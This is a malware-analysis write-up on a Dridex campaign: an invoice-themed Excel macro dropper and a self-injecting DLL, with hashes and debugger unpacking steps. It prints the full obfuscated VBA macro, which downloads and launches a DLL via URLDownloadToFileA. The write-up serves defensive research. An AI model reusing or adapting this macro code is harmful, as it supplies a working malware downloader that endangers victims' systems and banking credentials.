Dridex specializes in stealing banking credentials via systems that utilizes macros from Microsoft office products like Word and Excel. In previous recoded incident the threat actors have used Dridex to hit high value targets with ransomware [2].\n\n In this post, presenting reverse engineering malware of the recent Dridex sample that has been found in the wild earlier this February. The analysis highlights the techniques and codes used by the threat actor; and the method used to analyze this sample and extract hidden IOC and files that has not been detected by sandbox. Note that multiple labs got different artifacts and indicators so this work is almost a contribution to others security labs and researchers. This malware has two stages, the first one is an Excel file that has embedded VBA macro which infect the system with a DLL file that runs as a process in the second stage.\n\n\n### File Name SHA265\n\n\n### File Size\n\n\n### printouts_of_outstanding_as_of FEB_01_2021.xlsm\n\n\n### b721618810b06ed4089d1469fc5c5b37be1a907fc1ae14222f913c6e2b0001c2 115.81 KB\n\n\n### libeay32.dll 26a659ec56c7bd7b83a2f968626c1524bda829e0fefff37ecf4c4fb55ad158e3 570.00 KB\n\n [Table 1] Samples Basic Properties, Ref: Any.Run [3] [4]\n\n## Malware analysis\n\n### 1. Excel File with Locked Macro\n\n As what appear to look like an invoice delivered via email at the first day of the month is a malicious spreadsheet. The XLSM extension is indication that M stands for Macro and the code only runs when macro feature is activated and clicking on the sheet! What looks like cell with number are just images linked to the macro.\n\n\n-----\n\n### [Figure 1] There’re three hidden sheets and locked macro! Apparently locked doesn’t mean password protected, it means locked! And can’t be extracted and reused in new excel for this case in particular.\n\n [Figure 2] To debug this sample require two steps:\n\n\n-----\n\n### First: extract the sample and locate the malicious file that has the macro using oledump.py. Identifying the macro is located at the fifth stream which is a VBA code.\n\n [Figure 3]\n\n Oledump On Linux machine Below is the extracted code\n\n\n-----\n\n```\n#If VBA7 And Win64 Then\n  Private Declare PtrSafe Function yellow_pages Lib \"urlmon\" _\n   Alias \"URLDownloadToFileA\" ( _\n    ByVal pCaller As LongPtr, _\n    ByVal szURL As String, _\n    ByVal szFileName As String, _\n    ByVal dwReserved As LongPtr, _\n    ByVal lpfnCB As LongPtr _\n   ) As Long\n#Else\n  Private Declare Function yellow_pages Lib \"urlmon\" _\n   Alias \"URLDownloadToFileA\" ( _\n    ByVal pCaller As Long, _\n    ByVal szURL As String, _\n    ByVal szFileName As String, _\n    ByVal dwReserved As Long, _\n    ByVal lpfnCB As Long _\n   ) As Long\n#End If\nFunction last_counter_a(nimo As Variant) As String\nRandomize: df = 2 - 1: last_counter_a = nimo(Int((UBound(nimo) + df) * Rnd))\nEnd Function\nSub Prv_invoice()\nRoLo = Split(RTrim(first_prepayment), progress_bars(\")\"))\nSheets(1).Cells(3, 1).Name = \"ForA_\" & \"s\"\nstorages = Split(RoLo(1), progress_bars(\"+\"))\nFor A = 0 To UBound(storages) - LBound(storages) + 1\nOn Error Resume Next\nSheets(1).Cells(3, 1).Value = \"=\" & storages(A)\nRun (\"ForA_\" & \"s\")\nIf A = 12 Then A_min_1 = re_order:\nIf A = 14 Then\nvega = re_order\nyellow_pages 0, date_to_date(last_counter_a(Split(RoLo(0), progress_bars(\"D\")))), A_min_1 & \"\\\" & vega, 0, 0\nEnd If\nNext\nEnd Sub\nFunction re_order()\nre_order = Sheets(1).Range(\"B1:B5\").SpecialCells(xlCellTypeConstants)\nEnd Function\nPublic Function date_to_date(rr As String)\ndate_to_date = Right(rr, Len(rr) - 1)\nEnd Function\nFunction first_prepayment()\nDim cooperation As String\nDim rest_che As String: Dim value_cargos As String\nDim u As Integer: cooperation = accouintis(4)\nrest_che = accouintis(3): value_cargos = accouintis(2)\nFor u = 1 To Len(cooperation)\nrezzzult = rezzzult & book_rebook(cooperation, u) & book_rebook(rest_che, u) & book_rebook(value_cargos, u)\nNext\nfirst_prepayment = RTrim(rezzzult)\nEnd Function\nFunction accouintis(d As Integer)\nFor Each ds In Sheets(d).UsedRange.SpecialCells(xlCellTypeConstants): forTwo = forTwo & ds: accouintis = forTwo\nNext\nEnd Function\nFunction progress_bars(df As String)\nprogress_bars = Replace(String(4, \"Z\"), \"Z\", df)\nEnd Function\nFunction book_rebook(y As String, k As Integer)\nbook_rebook = Mid(y, k, 1)\nEnd Function\n\n### Second: Unlock the document by using EvilClippy tool which removes the malicious macro. Open the new version and create new macro and paste the above VBA code. Previous incidents involve Dridex also notice the use of EvilClippy use\n\n```\n\n-----\n\n### [Figure 4]\n\n Unlocking the xlsm file Before debugging the code, the main sheet and the three hidden ones got some characters white colored spread among cells by 7×7000 size. After a bit of cleaning they appear be random, but not encoded.

When reading it top to bottom one character at the time it appears to be URLs. After complete running the code it generates over a 100 URL, all the URLs are in Appendix – A\n\n [Figure 7] Debugging VBA code After re-debugging multiple times there appears to be two random IOCs generate. A URL to connect download site and the DLL file name. What’s interesting is that some! Of the generated URLs are not from the list in Appendix -A and that is what Dridex is all about. Below is three samples of random generated IOCs. Further IOC are found in VT.\n\n```\n\n-----\n\n### [Figure 8] Dropped DLL file\n\n [Figure 9] Date-to-Date function selected URL Finally, the end of this stage is creating a process that use Regsvr23.exe to run the create DLL. The third hidden sheet contains the end/exit function of the VBA. There’s temporary file generated in the %TEMP% folder has a cache version of the macro. Other network and host-based IOCs are found on VT.\n\n\n-----\n\n### [Figure 10]\n\n\n### File Name SHA265\n\n\n### File Size\n\n\n### ~DFDC192FF5186970D5.TMP 77AA147FC137EBB5FA8865DAE56ABC21A66E87B8454125666A6F80F589A0005C 32KB\n\n [Table 2] Temporary File Created 2. DLL File with Self-Injection\n\n Up the time writing this post 13/69 of VT engines has detected this file as malicious\n\n [Figure 11] VT This binary never been seen before the incident and the compiled time from 2009. Other than that there are couple of indicators this file is suspicious like the file size compared to strings, imported and exported sections, and resources section\n\n [Figure 12] PeStudio view of the original DLL file\n\n\n-----\n\n### [Figure 13]\n\n When running this binary on IDA it seem to be too much gray and less code and resources. The binary isn’t detected to be packed in Detect it Easy or PEiD, but there’s high Entropy.\n\n [Figure 14] IDA\n\n After few rounds on x32dbg it appears to be this binary is using DLL self-injection technique. To put simply there is a hidden code that overwrite the original PE file with new file during runtime. This technique requires to allocate memory space to the hidden code first then extract it the code in the region of the memory. The overwritten happens on memory during runtime and to make it happen it requires two setting two breakpoint (VirtualProtect and VirtualAlloc). Once hitting certain space memory it’s possible to extract.\n\n After few runs and reaching the EntryPoint on x32dbg and being on the right module and setting, it is time to set the breakpoint\n\n [Figure 15] EntryPoint of DLL file\n\n\n-----\n\n### [Figure 16] BreakPoints\n\n After hitting Run (F9) few time you reach to a <VirtualAlloc> breakpoint which by checking the EAX register appears to freed up some space\n\n [Figure 17] Reaching the breakpoint\n\n Before running to the next breakpoint let’s make sure what has been allocated by putting breakpoint to return (ret) or just Run Until Return [Figure 18]. return from this function it appears to be some random data has filled up EAX [Figure 19].\n\n\n-----\n\n### [Figure 18] Empty EAX Register\n\n [Figure 19] EAX Register After Return\n\n\n-----\n\n### When Follow in Memory, it appears that memory space has Execute, Read, and Write which is a sign of hidden code to be executed in the next steps\n\n [Figure\n\n 20] Memory Map x32dbg After another Run [F9] and stop at a second <VirtualAlloc> breakpoint and free up space in memory and by checking EAX dumped value it appears to have nothing. The memory space of the new allocated is also with ERW privileges. It’s the same as the previous stop as the <VirtualAlloc> but this time different memory place and different gibberish values\n\n [Figure 21] Second VirtualAlloc Breakpoint The next Run (F9) would be stop at <VirtualProtect> when dumping EAX register, there appears to be something close to MZ header! By checking the dump values there are some normal ASCII characters that resembles executable binary. Reaching this point means the next Run (F9) will be overwriting the original PE (Libeay32.dll), in this case, with new file\n\n\n-----\n\n### [Figure 22]\n\n [Figure 23] Packed Executable\n\n It’s possible to dump memory location from x32dbg Memory Map, but choosing alternatives is sometimes better like using ProcessHacker. When running ProcessHacker in Administrative mode > selecting the running process inside x32dbg > open Properties > Memory tap > Locate the same memory (0x24f0000) “which is dynamic value different on each run” > Right click and save\n\n\n-----\n\n### [Figure 24] ProcessHacker Dumping memory\n\n When loading this dumped binary in PE-bear, it appears to not having any Imports. Which is normal because it’s been dumped from memory, but it requires fix get things right\n\n [Figure 25] PE-bear Imports section\n\n The fix requires matching the ‘Raw Addresses’ to match ‘Virtual Addresses’ of this binary. When values matched the Imports section is fixed and shows DLL values\n\n\n-----\n\n### [Figure 26] PE-bear Fixing Raw Addresses Compared with [Figure 12] the new dumped file seems to be entirely different binary with new compile time by Sep 2020 unlike the original PE which show compilation on 2009\n\n\n-----\n\n### [Figure 27] Pestudio look of the new binary\n\n [Figure 28] Pestudio strings
